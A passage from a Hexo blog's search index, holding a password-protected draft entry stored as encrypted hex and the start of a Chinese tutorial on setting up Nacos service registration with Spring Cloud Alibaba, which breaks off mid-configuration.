201335d046b1b9c7814eda77e53036edf9ce3eab08662ecea8a3e8dcf43799a72b3a02fac96d754dba67e330b10d2a3b58781036ff7db70cd46d46dfacc248edbbc01f2a6be32821534b37b66353875d71424ef163a4462852807b59f48a71e03b9de0e819367d29d3e3f6bf064cda5e8a9788765afb3491cdcf65720ddadf70b2965c0c29376f9711d823c91ad1a3bb06bf28bdfa6ce974565d0f2b4fe0ecdce8ca947dd8d43bb27416c565943fbef76afe78608ee39feb75de342b71a4b0371e7a9931a7a5c634b5b114546f977445865203a06d3cb9d379bb16f1e4a1e08429daf8ab95fcf4f7239d3839dae538bfb18e38a9dccbf9b7dcae7cd6ee8e77e6440c5c3f3194242b5452a167f92cc7686f667081ddbbb751063ff31590f9343709484b09f9c8dabc93671eaf3eceda4a8b834e0692f847b469ae1cb6257bdfc735b9e88959b39052ebd5dccab40ce7b793c18add8e1eb9ff7c26abca7cb67705f0182243dc87d87939f89fb34eeaa284766b4e5c86886cfe9b9f7bde780985719116f6ecb0aef015deae3a6d8e744725aa47d270c7f8f9742f4cc7db2f8b2fa93ed231690e157c871a299ba85911c4e3946826318e3012852ea1690a7a7b4ca3027715b990cbd3121ebeff29a37a1dcf663af10aa05d80e0a63b038516db1d01afdb11654091a08797f9d41f900c24ca0be96c874127e9c3ffaa5d5884b9b8085534414ff6ebe6db81c7c029ef0c5142ae56ecda22a0b31aaad7242f50a5f1a657bc05fb63d67fba2fbb331018618e406f2bcdf97aafba5a27e292a326145a2fe10973dcb57ca0c2e0fb60f8e32e0acbb858d0d45faa294199d43cbd376a7bdbbeacdeb3bf23bf6c7fd53427b3c4ffca49feb3afe133cbdf073b5672c52fa0727f5565c2f7a328719ea2e3ae7a593d22f4a4aa5344acccff126feb4e3ba751c1eab97dd0119dd246c6223b28e37bba859556caf74b23bff1363ea1b917450f3b495f4e72874d8213bfab94fd445f89fbcffd1305865e3a6ca326ba7f2824dc7bad027b85593a528b803aa401366bd1c07b79cc7a5cb07fd13c42156a2326a0d8de9860e8eea6ac8e79bc223f7dfd326239551f96b8f0a924d3483195ef4e609b0a458eac3623dc6dd9cea8dafe019f1fa20d189c692e615aa57a09c6df23904d92e1cbfb656b580019733650fb2826667d48b3d2ffbabb7758d81d9eb283aec2f908f2eaa65abe821863726396915cc456f1a63cf520ec338d0941fe013bb6b57919346b3c8bd1940b118d91a67a130043f23050ec731fe69e4e3a1a0be38ec8b90e3b4bda67235ab78df55d1fb2b5ce58dc5efb9cf5d8e417fc1102bc1f3b30c162b0a84e46e95cd7e929ccbaebad86dd1e6c749bbdfd4dffd5a73816ba8ac8cfb57c37402423019d4a5a7fbc9397382a99dd0e6c597b55a4e943fd83639198caee54b182d4ae13f19ba41126ad52848acd9c38c8a65b72e4bc162ab619df07a834f8f43a68ec93e2e07ebcc6dfb6a37893a5616b8f36722dda76f09ea6865e1cdeeecf3a48230e7083291844903306c14eed691a62a05a1768d1b80461e62a0d9693d59911fb6c2a7d2a586167e4f2cfa3961506c9d63df04010816099eb37a9174d11490b664356b41efc171041f3c4dfca2561e8181f6c724c5c9e953f27198018a76ff77fa0cb35250fdb6744303dbee90e6d1d1fbbc48a650ca66ccf766c4dc4c96dd50ea1e6db81e624084becff2ade3cafb1827f5431de2b93ce3fc126b8d2a9557957b70289721844579d75a2e10e4cda0025c7cb24e490e4fe4030d001afc63d5ffdc3806090a32a4ff2672173d9a1b1a52722472acb919c78d929941453a3b953221a8d23a50538ff6c29fe631a8d811237543e71d30d9d447cd60ff6b7a0a7848702881d97c3211727926f4d1b7bd265f7110b8f5f9db99afa572bbf3ee62b4be8b202b8ece99378535416dce4b750d3e02626bc1ee7ed918c60795d192d95646c8df71943e6e14abfe0be63146cca401b8d46128ab9082c986450db25c3ec6d750d5bd71ca22628caeb50254bc6dae81b0a41270e2093755a18f0bc7f85d742b843426d1fa1f2d019072ca1c9e57fa85cf2a85080aa097a6037b8c9c263120ae350153e63e9c74319ce94efb5f8bb5af9e86e25ecf66c75d06d6c373be84e93668f8e5ec3dad08da103ffe8059ba1d5e8c490c274a6f850296308f1ccdac6c1d78e1d0db75ef48b8e1ccbb3c1dd879af0b81614ce20f0ccf632ff9d9e9a9af4c0e15913ef0681410f95905c120f090c3af97ae367194bc806f11f2a88a8de7a804524c73edcabd2cc56ab62042f6d9aac22023bd18955bb47e4b425ca483a37e21d88d315a4627e93a00d68d387bec5fe7e02fde63343efe21c9215de03bf13599fd89ac5b7becd913adfb5d24329b9d504c4482be79cb036d6cadebbdc2126933be29fadc7c8d845f7c6f5e4dd3e8e4797a591c7a46ae2ced09940fe40a79c8d26a9da63afd9c3ee99e1daa951844b397fc261e888373c921f1b4c9ad5f56825d56285adaca3f19add067d4a3a66603db6682d7c02d3bd43ea6d680abb117ddbdd77ff19d3dd79e0b7761c4803b6256a99f0620358b0a7d27c09e80a90bca3cdb8432cf2fc1c63752b531302856657aeb9f2f9f339fe5325eb782364aed047f9f858449c27930337fa50df9e1383b419effcbc06f7b97586846f9794fca9764e629f048d72828d08db069cbc341435c3f6a2df336ece381db4e14d5639e06fb5f5db218b6e2f0f569ae292ead1ff030fb7413e77499a3b071254b4fbfc4e16c793137ca7db2e2a189898df2721ea429df9bfad8ec5eae28b21a71780bed3cbeb58724973a51609f7af98d863d4c447d706ac9c07410f8e0eab19526bd1b803600684dbb6bae34607aba8b12adf43e1337723677b009231502e06f5231225c88c9eb223a3e7e13d513ff347800c4c575dc752810cbee726b5e5e1a33fb75a12784a683f2bdc5ed9850ada56c9e8d776e4f4fbb83a716d07a01f8b3467bdbfce7bf2ea0ad64a9c0c992c46a1929d3df7fcdc04cc58152263d1d184fe10497017b1e0b6f1b56c6881a4948ac3be3176e4ee9c456fdd383126de45426d14ac8ef0d88d5d822c6097ed6105d75fb8827b91cbc130782270695ef20a97172f22ff1ca9ad70f55759475e8e67a7f3ab38550a0acae3d188bbd8a3554129dca309df57a300e0bab562a96bfc95a02362cc6dd5c22ae85c4be5ea38b2bcbfe224bf587228e8c4f9d24accc57ec517496bdee442719027951f2c38a68ccf0a54906922a6ba5748ffb46e2a26c2dc473db5cbd41f5ada83985e0ddca1cf1d2d509cf55603fe628cac045d4fd0a9331663f29972aa729104c9eafaea195f2e68a216cbb5d3a6b96e712c43530ee4a50d157240ef1506548eb72cdd986ad3e120942c84deab89dd0874a43c805540c00dd51aaefe725778f1ba2d2fb54c6e1f526eda27f82ecb7ae72311ef796160558d956feb0b0baafe14f5277d0c7d3f12f3718d1324e4180851266dd149f627b41d990745fa7a29d07e37b89964bfbf1aea3fc8c3c669f54706406178948e2f8fdb5fec3cd9ec7d9171a54dafe5c1ad374e3a595c0258ea8a8bee79841df415c1edf693cbe11f286794e6a4e2f142f833f3b76ad3ed931f784fc926adb86eb12ced8065547f6dc56f83ba5577232fcb2ab03be4ed179ec26909c17500e9764199019b62e2448b782b8069af564d06aa1332a2caecb6c3fe4777909f242bd7fadbb35925fabed1f00ea4aa2f6d2a28a13369db37e2046668528fc80bd1ad76d740b04b51e89a65c9ad005cf29cfaf5139c57a2f76de4db3e6ffb40903c2e07eab37163e8e69f0336fd9aae68fd21cd4eb34d9d618fa650f07ab21327c5f2966f28c0edba695a834e9ab063fc832848963352d51f361590d3122bfa2964c17d76f624bd02c2fa5f98a5562e0b445d11578e208dee039f66973218cfdff55b625a1168ae2c62172e2582781e52ab275248e1264e1b9595cce0de2977633dee38860725b41cbf946edb2ef225cfc9e91ee995508a519858513b0207c7af3d6179de4c438d5b73babb5723b36168cabcee8ab9e6cf7cf3c8cd856b9b249e6ccb0f3de60d6bdd54dbe8a70b64fd8446e0c9449c96b6b8976b0173829dae7493f90dc85a20acff60bc1beb53e559196304d09b38af272a92f2598fd67827cc6ad34bc23cc434243ee4f7b06b69e00bfef4981eb1703800299a88f3b014324496b82a0d37603205e94deb97c15947a2004021d63841829d38258dc5b67b53a50204a353116e5d4cda6d304554803112633b3a9ca6e964f61122964865b4ef318dcf5688a8e1eeb815032a3e9c730197855879c3a2ee3d99ffe591aa93901ffa8eb6f4df461ed822d55c92f55bf1fb8304add0afc812ded594ab9c1623a5d92aa161d4e549f21c0a48e4091061904191ba8a617558851ccfc5e627771025f971ded7e22531033787967f60bb8aa58f47022f2154bc1a6695ead21b2f32b463c6c4f52844b8d0f71f835c53e4ec39439647ff31eb8f9826f1bdb91a69109ade9af8e31bd69789ed53c5cfadc8ca98fe5820543c5acf0cd20bc793a9184d114f7df7ab539be44981a9dc6cfce6d4737f421775b44283e392b7223569ed03dc102a15c20b421000133396dde8e0e26d4be3743a06985f60e8d066cb4387ada7351da138596f7fc5f4d907085d5588469cd30d927382b9e978d6d93829cb813753406938eadb95c0e4720b28cfdd1d0caf28d554f858566a28c097ed3b66eb04c26c8b7c0b93a717d5a7fecfc6f36d4318380e041fabe9d27dac635a45bd74bb9537dd3e70a12486b184388dec2c6831e328cd01e5c1ce54464f2dfcbe4c227450151fa68c091014ba743f54bbad13a83d39803e2a3bd077e89e3c7bbcad6654c07808eb1883cfce0cfec604bfbdcd39143445bef82841bdfc9787a1005b80f4f6a78f6606e13e3b0b6d24ebd66b5166d16d545cdce02d813935a2626fb667ca89129f80e84c894b7f79a72575d89fca925c5a8c53fee77f1e29ffd8f250ac7d1b326e309bf2bbdfe29ebe9d3d65bc7ed3cf0bdca7137c58f3b961b21d47f2a2fdc591f57982892025584a3dbe197ba1b4f5b7e115ea2669a4a166e31e5a014bd781bbf9f9dae52160ad8ea631d5f8647e75d032915420d84c3167515c57a3bfbf179a93e9a4699f306755a4d21146901069af97179a25c8a294af64546b23bca6405ed2e6d687e92e70d5ef3eae025a309af572f15111a3eec676e42fe9301e09279a85b9c16ed6a24958d18f0f9be9c77ee93e47c8e040aff47054c76a2915a8208c5fe2d89514f0a9ce57427e00e48d6c69d3842fd8a5a925667cc00dcc8e894b3163f19d94d27df61339a1aa6122cefe8e359dfe104a90810fe0eb022e8037b3365d73fe0d69cfb7d80fa4acec0cb1de0a499d5bca8e0821f60f46ed15e19ebad140a68ab2a256f1370ac670ae27c37ec8a0f30d3698459b70ad4a1e72584c90b58b5439fbfd86543b03e018052d9beb1dbffdf25110b5d363d69a1eba71c107922303612f228d569ba790c2165a7a7eb8292bb2d1da84b459692f3cb56e40ca1dfe6f934798f0b4f45279a813478fbd9483c7025586c45b793adf539106de5617f4489098faeb3a87236fc8f3e984ecc0f4efd18d9217615b1fba870f9a9dea2a0fa97475a379c80aa9eee3b3250e97c43dd47902b8bbdbd8cacb9cbb8f2ac0d2f792a3a65dea4b4293c561e60f3a7661956bce75bafc5cae5ba0bdc20369de3b0dd05c44db237120b99c91b95e1be19a6c918da04dfdbe60ea9c1069c9fdfeb988cf5347c650f8003135c1515db870e38117e570628de0127e96e6cd1d927aebdcb62c5e10738ab03c2052af5615f07b0a406a1be3c31ae2d8d974b6cfea8776e4acbbfe80dc2671cc872fbc88d7c835f1c12d3b5ec927c87f9bb3351deab3377ae0c43d315d95bcf7d913e9b993eb6e7315f79b09363bb4fa7025365ac12b8d10507653083338ece749a6b058f4cb9b0d6849578145b76e8192bd9d5f1fc4caf08cc284df8210ddeb56baaaae3be98f3d580a403cf28dc1d4da33add0853d445a73cd0e7342604b3e4e109a570d2deaf348bb48108463c54257b58ffea848ee5469bcb0e2408f696adb71abbf913213d5ab3d9e8ac835e2a5ee05eab6cac059ac0d791033e409fe1775c20c6593d3ccd5edcc7c3e1aeb017e125cf98de9d5fa655d7d87489d0a13f86e7fdbf984c562c227491f0fb4e77ed59095bba52b6ac82c9fa559ed0033cdb313cd38cbc0b96fc88e22a3b130f1b1d911bde796eecf68012dabc0e0a1f2d7d39e4a2183965509b163734776107ccc879c3675ea54ff31c88acd45ccc4bfbe01b472b2f89eede98dc67f4630f2009a1329ffacedf06197e864de7d4ba87df4ffc552be7bda0b782f3749d7ae873e26c8f9e9a703e35d9388d8ec612301cc7183c41b17af5b60049ab3534b36784f4b7a04d5b1701543246ff2d2b8d30c504fb70881e8c622c3bea93577dccaf543cd081a386a8831d813a668e79d5d95bbfb4cdc9e2a8adb8d85511b234ee23d24cdd62638e5e7aa8307cf915e27b3227d2863c66bd53f5a456b903d49ec31c10bcc997cf31911f435734620801b856f1857399d2fbef9e623514066c08ebae37630a5db656831244dc9bae6b85363ed4e60c3d66558d4278c462ad8da38f1e42c2b8bc9ab6915bbb97fcb440c0906ce90d594370ad9310f1931b3c0a92e9bb29114a8ac98634d5063d2b6f6ae605794bb56bce23d930903b9f8bdbc035f00ec298ba9bebe1e166306be764c0ce885f700824b868446d04d5d4b83281619afc33b7389e6db45738dd43234f3977f4869455528a022266d681e12dc9cf341c7fa9e235a8b0605273f26d3a7fbe864725c3ed68a79ac936f6b3c4a4d2f7f85281eb5d4522dcd85096ff3cb57ecca0806809c2ef43461dd61f9a43ef72ebfa27ae7cf9bdc12faca593475ee7fd7514b5bf4c374631eb7b9b7925282d6170d9006c453218e753e23d8dabfaa9cf3e0b2790bc95f4c15c24543a7259b36b9c62b9bfebcdc104d074fa180ec4f067c7ebbf726ce124fa0aa2aefc055535481c1b09c34e0b368232ceb61f8c1db058896903b8f15584d2b749476edb1444cc7224207caa168412764e5178ef8266ccd695f0a3b6a33125c5ff81cfd5a3b8f80231db0aac0de16a37ff691cd859325b48098e95383fe584a9d6fdf0fdbec150e2019add45ac1e4848fdc16c99d431740333d2e2ed3525e41695968a5a9444b9ab3d69a4783ad2b27b317c58a25b5b0338e98d8e6ced60f01ac564fd1c4ec0535d76a829cc4731234fbea51d87c222ee16570627fc42b3bb51e1fce4cb38c065fa194be75aa3a8e2e02a860a153e9cade3b93fed61720441ea107dea660a22b1e454fb158184af79e4737bea64a4b6ea75c644d73ff6ad4eec3c2e1d1913837735db7aff54a8c79b5a6af12d9c05a544453f9a8317c5d4cdeaae901157fc25e23a920a257ac9b824104693ca6469274b3adc674a752ad44e6f3a1870980cc430c147b756c84b0cb21603c0ec50345a2b333b5bde669fcce049e4675ad273a7311638dc76cba6c8370a28475cb4e7e81ab7ad5652d0b1522fc085cee52fb7f0a2482c0109d2c4d69459ecd0e0611fac5539fae3407f62ffa6bf2081ba3a64ce20359ad09e0f52b6a9dd342e1c2a53db22ce598b5ab5d8b997cf0bd861f834ac61bafbde26d9d721eeb86744e45188d2e32727cb91a5837acd4243edd38f4a938ea7768a6fed748fd64963adb95a56920618caee314cc8b9fe704202493046c3c235ed7ce69e01d5aeab5294bebf709c8a9d968931e7f8a1048e92d8b8442da1525ac96d5207bda76cbeb1277c4afa815243e99ca5b0679f09187764c1dd3dcc7bb7bd8124989578ddaadd31e52fe4d4e9193f29822400347b427bc61bb0e523b98fb6c04b1534a40e8e8869338b79b7da8cb09ab5abedf8cbe0682a7d6986c443639db37dcfdbb41a89cfbacb812700ffd1df54a6e66d0f996288ffcd1a8758bf6939e15996193ae936b640a3014d1875edf8037a23bcbb8a0d9cdf3cf427995fde345c2d65c40bc4d157d5730c5ee063751dc95f287488c54d42153efaddfd5d0cad699def7bab758ef2a9129154bc0a91abc2915c2e6be605ec4f293928f37b745b7ea0cb53f16d5150de105e7e920e19b43fed7caf46023568d619492d5ecf8bebfc9832c7cfec4e70d2ab70879bb6bb15d707443c4f074997b1e05e22653cc13799fcf09118f09b5e83664485e483b2676bc9d1d13447ad45cf7d84c3f1a080804104f19be74e5c02ac9a81a5f7baeead1abebab3de5f8c65ce2f217d2d69ac29d0cb83736d13437501b2139fd3f8ae823c28edc65793965c889ffb17cd1735f262cdd1765f3ee3b058fd963f1d735abe567e2673916b64f7da3be16f39e51dfa43e77b7c13cd565e8f80944b97e438481aaeb94cb193fcca2742ff95255f87434f913c3677270c7b8b9bf2852a788647f24d9b138d78f32ae88ed5b7762c38d659b7a00e0fe571204cebf9328cbfe7cd70d3392874436a0be8eac3924b21cee810fdf290d7c16bb0e84efc99390238394f7f835766aa3da6a4f97d5bc7596d6d2e39b64579edab9f52b4ebe54ec49df4dcdf717d3e29c2731175e77da3ee3f3f67acf8657dcf142f05e9c9fd66e98769fea44480f1d017581d8a93ec64dabc616a29a010d2636a6f617826caeaf5e953e9a54ee2cf0661e8b5077def6f5b369efe9bb36d3930179f0692102d753f6d04726c692835061005b5c007a6d119ba44aa2b1bccfe70b9f0b5b3881f8077753732cb9059b67207310314b9257312d0d590272ce218133ffdd0b4340e31fb82ad79d77068e95d2ea2cc097f2ee3dafa4889c9d1ad4aca96f0df1948f01dad7e653f7baa8a266cf28d740179c106cbe7a99a61afe62683a31d18b54426f508cc2cd7b1fb2bb3ec3e5065a6cd94ec2938aa50eb83544821a7138cf186a2a2190967e1eaaaae344dcd07e6b38131dce25e747d6ff0413bf5957648cbbbac8dab127de95d06c1d7b27f344ff1785f5b317b731394baf9b453e1511f00a38701f595d0b7f6501228946253d72b4f7452530c3eb76e6499cd45ab4042ed90e03da3e024dcd49348b02705a7f39167465d92825764dac4358aaac118a3486b12c5cdb9e74b664e26f5f8f2ea1f4ec529b1d17886bf466a5e59f246eeabcc75b9360387a865bc7dd7aab9e34bd4263836ac7d8c67a21496ff9454449d3160080086d4e640f57043c08c02af19742d229a8a4a7fc4b3caa34797c2e59613c03b1391b1c6ae8f3e8d70e3c4e7a0e84149f76b9cbe5ffe717cc1de9b303298e78fc0b31d361ce355df08247fff2652e3676f9814580ab42a576bb6a51d354196be90ee8ad138c66ebfb27ca787e17cffc79be5e87abe878b48ce714145e46f7aba509ad0153b98c6989834f843f77f64561c89fdec21f5cb4f2c88fd3bbfb602784d59833753ec1f89b74483afbf54a42872a21ccbea7ad030d41139b31d7bc86f983f902b51b9da3a51d9882c2d974e2644210023c65997c60601309f89e86ba3e26dc8b8b18b6cec38c1e7dd1e82e2a9f7917b8db586a0d073494c1be784bf2b6a30036dbf4080bfc80dd08b1123afce39cb4a353ae717edd9772a4219b2736154a8f66b85c5bd653e10bf4825b139ea7667cbae93495b760290fdcef664783dce410c73cc3d332e1e46c32436833f04a762c9ca1e4b9f5d666ac3a2eac11e6f1f786f85e2d1ed0c3bfbe0e4a9974c139a4ef7b4b13e3c661e8e37abbdc66a5ababa6ea5ad5e0504b8288464fb4c69691ddaa422efe48c116a559ab64058bfb78eb74b5ea5ad58d173d1c75b28885dd60848c789890437f206f95f46a8d3d0597ef2d524eadfccd4be8e544b37897651cf0a7c721a4e27809e316d2b2eb938b573c23f5a2c31b8ed9e8990b3fb04773155b43ff3c0da27ec602dceab8bae2f74923a9ac591e22f55003617d2248278fdaf2a6852e14843cfc6878b647cb16245fcd349650841a6961e5886cff9e9e4806e4b246ab2308dfcaef01c991938b9de7405662dbb181b384d6cac2ced8d7e6da33dc3fec56dd7c6bb919744e0caeb736e142cffc4a2d0ac5f117ddefd8ae24c7120948c6c013408f226bf188f87af9bfdd665592131a01398f70bf2f06e88732e3815de23605ae8816843754b6daef089b78ebb2477a1189fe29b2dc57162160faf35bba00cc139331e2b299c0cbcf7d7f5e0ba3dda5f28f73bc1dc34b8114c1297c57ac25187b2c8624b7696f0886c343c87255d1d9170b459898a9f8d58e3eac63801b8aa9416dbe905997d18fff8aba55ff0d74024a08062c1ed02e48d9dae8f4afbbb616f9f770916ddc392fb74aa4d477d110869d90ab47810d161b25b9a8b94ebc7fac51bf0df873d34d2e8d286f7af2dcfd43b7c8a4516197a2f544b35b401249b9fc6ac650d0cefb016d3a7cd5f4822aeedbc6b646fa2e2380de2232fc6cb8c8161c742af749d8f758d7bc5b97016c35d388771b6d4daa3a9018d36a32587075ac4df80dd9f3175e67412161190eb18c4b5481fbe0ff5ecf2f1036d345032bebc6cd5cede880e3bf17a8c5f00b3739e1942af30341b1df8360a167bcaae45aa89b73d91cc6d1c09be6d2d515cb00f0a90fb18a62432001918dbc8d1d6e03bed6107db480da71b605422b57c020db32022a8ee98890158e8c0f5d4a4891ffd113672bbd105c1be8edd26b88159fa250481fc0d636ea37baf8b496cf661849d77957e4935070a107078270365162cacd3f8d41133b24e0f1989a464944f3f9b7981145b94d409126290baa118a579446b088cbf31a8d8fee5d1b179d303461f8ee8772a781f6cb45c55c1cb5162ac1bcdae29fcf978439951e7d558dd2a0dc16bd06ef4be15df894bb41cf2fb7aa299d15e0b945e93b006fc1cb83dedbffa13718750b8e2d13f747041991f8acef1e22c0ee257319f2f6787e931b0b172dea467a06e4422bf55cc22ac37ed6ff7fd4175cdeb79515bbc3c8a6e37f36620b138e402ed10a956901f92cb6f7f50fa442086b79daefee056792f8d6f14c716a5d38ad6d2d46846d50e9485661e14b7a6ce4679803ed1fc024ef30e2e0845d31f9119096cbf14d5648f99ccc44dfdc9223e2efe4a997b90ea3a900f557f1e4f79621249f2cfaa3a03884ed29c9ddeef57699e8b246740ff411ec3300ec419c812b205457b758759b42e5aeae99f22545df1ed14eee5fbfe148f8cebb93086ccf734307ab554edff64d495425c4166bd68c9c893738f6139cd19f0cc2206640c64bb53f4ab65a556a514673061075589adad16dae960642fd2186bc3d35dbf53169d17e6e6817fdd8b628a5b8594c70a23b1542afbaced03a49f37fb2b976945df4503343983beddf2e514dade294b2c7f4a6d1508d4e92e30cdd5d4dea28bd34c126c8c67775995918b63b834f25ada000d414a3d6d0968f1674e35478e557c3a8cb7a564f33cb8c3328e477443935aa7157284d0372f933f0faa42c2639bb83134eb3434fd86cde0d5c807e4e6ea188a21164faaad9d6e14d8cb9e6ecb38debe2c847ee6c2bf7b72d00c3628c02a24e43e224241850eebee688d38cdaa019deabcd9162e5997aba8a657ade0e641716f23bc3448331161b95964e9f1ff3c30150e8e1c7fd434cf51e5e7271e326c57959c368576676a2d85f8be818671d62</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">抱歉！文章还处在草稿状态，暂时无法查看~</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Cloud3-SCAlibaba</title>
    <url>/2025/02/18/Java-Cloud3-SCAlibaba/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="D:\workinenglish\typora_image\image-20250303174041379.png" alt="image-20250303174041379"></p>
<p><a href="https://spring.io/projects/spring-cloud-alibaba#overview">SpringCloud官网</a> 	<a href="https://sca.aliyun.com/">Alibaba官网</a>	<a href="https://github.com/alibaba/spring-cloud-alibaba">源码</a>	<a href="https://sca.aliyun.com/docs/2022/overview/version-explain/?spm=5176.29160081.0.0.539034bfR0R5Av">文档</a></p>
<p><a href="https://github.com/alibaba/spring-cloud-alibaba/blob/2023.x/README-zh.md">介绍</a></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250302193940.png"></p>
<h2 id="Nacos服务注册和配置中心"><a href="#Nacos服务注册和配置中心" class="headerlink" title="Nacos服务注册和配置中心"></a>Nacos服务注册和配置中心</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><a href="https://nacos.io/">Nacos官网</a>  	<a href="https://nacos.io/docs/v2/what-is-nacos/?spm=5238cd80.2ef5001f.0.0.3f613b7co1mDDd">文档</a></p>
<p><strong>Nacos</strong> 是阿里巴巴开源的一个用于动态服务发现、配置管理和服务管理的平台，全称是 <strong>Dynamic Naming and Configuration Service</strong>。它旨在帮助开发者更轻松地构建云原生应用，尤其适用于微服务架构。</p>
<p><strong>核心功能</strong></p>
<ol>
<li><p><strong>服务发现</strong>：<br>支持动态注册和发现服务实例，客户端可以通过 Nacos 获取可用的服务地址列表。适用于微服务之间的调用场景。</p>
</li>
<li><p><strong>配置管理</strong>：<br>提供集中化的配置管理能力，支持动态更新配置而无需重启应用，降低运维成本。适用于需要统一管理配置的应用场景。</p>
</li>
<li><p><strong>服务管理</strong>：<br>提供服务的健康检查、流量管理、权重设置等功能，帮助优化服务质量和性能。</p>
</li>
</ol>
<h4 id="下载安装启动"><a href="#下载安装启动" class="headerlink" title="下载安装启动"></a>下载安装启动</h4><p>本文使用<code>Nacos2.2.3</code>，<a href="https://github.com/alibaba/nacos/releases/download/2.2.3/nacos-server-2.2.3.zip?spm=5238cd80.2ef5001f.0.0.3f613b7cNchNz3&file=nacos-server-2.2.3.zip">下载</a>，在解压后文件夹的bin目录下使用如下命令单机运行：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">.\startup.<span class="built_in">cmd</span> -m standalone</span><br></pre></td></tr></table></figure>

<p>访问<code>http://localhost:8848/nacos/</code>验证安装结果。默认账号密码均为nacos</p>
<h3 id="Discovery服务注册中心"><a href="#Discovery服务注册中心" class="headerlink" title="Discovery服务注册中心"></a>Discovery服务注册中心</h3><h4 id="服务提供者注册"><a href="#服务提供者注册" class="headerlink" title="服务提供者注册"></a>服务提供者注册</h4><h5 id="导入一个依赖"><a href="#导入一个依赖" class="headerlink" title="导入一个依赖"></a>导入一个依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="编写yaml文件"><a href="#编写yaml文件" class="headerlink" title="编写yaml文件"></a>编写yaml文件</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9001</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-payment-provider</span> <span class="comment"># Nacos中服务将以此名注册</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment"># 配置Nacos地址</span></span><br></pre></td></tr></table></figure>

<h5 id="在主启动类开启Nacos服务注册支持"><a href="#在主启动类开启Nacos服务注册支持" class="headerlink" title="在主启动类开启Nacos服务注册支持"></a>在主启动类开启Nacos服务注册支持</h5><p>和consul一样，使用注解<code>@EnableDiscoveryClient</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main9001</span></span><br><span class="line">&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>启动服务，在<code>http://localhost:8848/nacos/</code>网址，服务管理-服务列表中即可看到服务注册成功</p>
<h4 id="服务消费者注册"><a href="#服务消费者注册" class="headerlink" title="服务消费者注册"></a>服务消费者注册</h4><h5 id="导入两个依赖"><a href="#导入两个依赖" class="headerlink" title="导入两个依赖"></a>导入两个依赖</h5><p>需要额外导入负载均衡依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--loadbalancer--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-loadbalancer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="编写yaml文件-1"><a href="#编写yaml文件-1" class="headerlink" title="编写yaml文件"></a>编写yaml文件</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-order-consumer</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line"><span class="comment">#消费者将要去访问的微服务名称(nacos微服务提供者叫什么你写什么)</span></span><br><span class="line"><span class="attr">service-url:</span></span><br><span class="line">  <span class="attr">nacos-user-service:</span> <span 